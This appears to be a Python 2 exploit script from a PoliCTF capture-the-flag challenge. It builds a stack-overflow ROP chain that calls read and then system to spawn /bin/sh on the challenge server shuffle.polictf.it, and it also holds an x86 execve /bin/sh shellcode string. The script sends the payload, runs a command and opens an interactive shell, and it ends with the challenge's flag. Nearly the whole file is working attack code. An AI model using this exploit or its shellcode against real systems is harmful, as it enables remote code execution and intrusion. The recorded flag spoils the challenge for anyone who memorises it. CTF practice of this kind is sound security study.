__author__ = 'HuyNA'
import struct
import socket
import telnetlib
import hexdump
import time
import hashlib

#
def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def beauty_print(data):
    hexdump.hexdump(data)

def read_hex(data):
    return hexdump.restore(data)

# from '\x11\x22' => '1122'
def print_hex_string(data):
    return data.encode('hex')

def pq(v):
    return struct.pack('<Q', v)

def uq(v):
    return struct.unpack('<Q', v)[0]

def pi(v):
    return struct.pack('<I', v)

def ui(v):
    return struct.unpack('<I', v)[0]

def xor_encrypt(data, key):
    decode_string = ''
    for i in range(len(data)):
        decode_string += chr((ord(data[i])^ord(key[i%len(key)]))&0x99)
    return decode_string

def write_entry(f, index, data):
    f.write('2\n')
    f.write(str(index) + '\n')
    f.write(str(len(data)) + '\n')
    f.write(data)
    assert f.readline().strip() == 'OK'

def free_entry(f, index):
    f.write('3\n')
    f.write(str(index) + '\n')
    assert f.readline().strip() == 'OK'

def printf_entry(f, index, delim='END\n'):
    f.write('3\n')
    f.write(str(index) + '\n')
    resp = readuntil(f, delim)[:-len(delim)]
    assert f.readline().strip() == 'OK'
    return resp

def do_printf(f, index, fmt):
    write_entry(f, index, fmt + 'END\n\0')
    return printf_entry(f, index)

def allocate_entry(f, length):
    f.write('1\n')
    f.write(str(length) + '\n')
    index = int(f.readline())
    assert f.readline().strip() == 'OK'
    return index

def strlen_entry(f, index):
    f.write('4\n')
    f.write(str(index) + '\n')
    msg = f.readline().strip()
    assert f.readline().strip() == 'OK'
    return msg

def final_interact():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def demo():
    data='00 11 22 33 44 55 66 77  88 99 AA BB CC DD EE FF'
    a = read_hex(data)
    print a.encode('hex')
    print type(a)
    beauty_print('kdfjiefoefjkafjieo\x11\x12')
def demo_sha1(data):
    print hashlib.sha1(data).hexdigest()
def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf
'''
sinh ra parameter cho app
./inbincible $(python -c "a='01101111080101100801101010110101'.decode('hex');print(a)")

dugn trong gdb
r  $(python -c "a='01101111080101100801101010110101'.decode('hex');print(a)")


'''
'''
 r - read from library
 a - add element
 u - exit
'''
# library.polictf.it 80
shellcode = "\x33\xd2\x33\xc9\x33\xdb"+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"+\
		    "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

#  shuffle.polictf.it:80
s = socket.create_connection(('shuffle.polictf.it', 80))
#s = socket.create_connection(('192.168.19.26', 9446))
#raw_input()

# write_what_where
# address = 0x804b030
# value = 0x8048726

# set ebp to stack address

#0x08049019: add esp, 0x1C ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret  ;  (1 found)



ebp = 0x0804bE00
sysem_address = 0x8048726
read_address = 0x08048696
pop_3_ret = 0x0804901D
data = 'exit'+24*'a' + pi(ebp) + \
        pi(read_address) + \
        pi(pop_3_ret) +\
        pi(0)+\
        pi(0x0804bE00)+\
        pi(0x100)+\
        pi(sysem_address)*2+\
        pi(0x0804bE00)+\
        '\n'

print recv_until(s, 'It all began as a mistake..')
s.send(data)

time.sleep(0.1)
bin_sh = '/bin/sh\x00'
s.send(bin_sh + 'a'*(0x100-len(bin_sh))+'\n')

s.send('ls -l\n')

final_interact()

# flag{rand0mizing_things_with_l0ve}